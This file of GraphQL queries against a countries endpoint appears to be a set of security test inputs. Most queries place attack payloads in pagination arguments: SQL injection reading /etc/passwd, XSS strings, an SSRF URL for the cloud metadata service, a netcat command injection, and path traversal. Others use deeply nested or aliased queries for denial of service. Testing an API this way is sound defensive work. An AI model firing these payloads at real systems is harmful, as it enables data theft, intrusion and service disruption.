query.query:
query {
  countries(first: 5) {
    items {
      id
      name
      history
      identifier
    }
  }
}

query {
  countries(after: "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- ") {
    items {
      id
      name
    }
  }
}

query {
  countries(from: "javascript:alert(document.cookie)", first: 1) {
    items {
      name
      summary
    }
  }
}

query {
  countries(from: "http://169.254.169.254/latest/meta-data/", first: 1) {
    items {
      id
      situation
    }
  }
}

query {
  countries(after: "'; nc 127.0.0.1 1337; #", first: 1) {
    items {
      id
      extensive
    }
  }
}

query {
  countries(from: "../../../etc/passwd", first: 1) {
    items {
      id
      annotations {
        body
      }
    }
  }
}

query {
  countries(after: "<iframe src='javascript:alert(1)'>", first: 1) {
    items {
      id
      links {
        description
      }
    }
  }
}

query {
  countries(first: 1000) {
    items {
      id
      repositories {
        documentaryUnits {
          items {
            id
          }
        }
      }
    }
  }
}

query {
  a1: countries(first: 1000) {
    items {
      id
      r1: repositories {
        d1: documentaryUnits {
          i1: items {
            id
          }
        }
      }
    }
  }
}

query {
  countries {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
